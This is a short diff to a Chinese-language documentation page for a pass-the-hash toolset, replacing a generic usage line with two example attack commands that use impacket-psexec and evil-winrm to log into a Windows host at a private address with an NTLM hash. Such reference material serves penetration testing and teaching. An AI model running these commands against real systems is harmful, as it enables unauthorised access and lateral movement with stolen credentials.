@@ -8,8 +8,12 @@ Pass-the-Hash 工具集
 
 ## 命令示例
 ```bash
-# 基本用法
-passing-the-hash [参数]
+# Pass-the-Hash 攻击
+# 使用 impacket-psexec
+impacket-psexec admin@192.168.1.100 -hashes :ntlm_hash
+
+# 使用 evil-winrm
+evil-winrm -i 192.168.1.100 -u admin -H ntlm_hash
 ```
 
 ## 使用场景
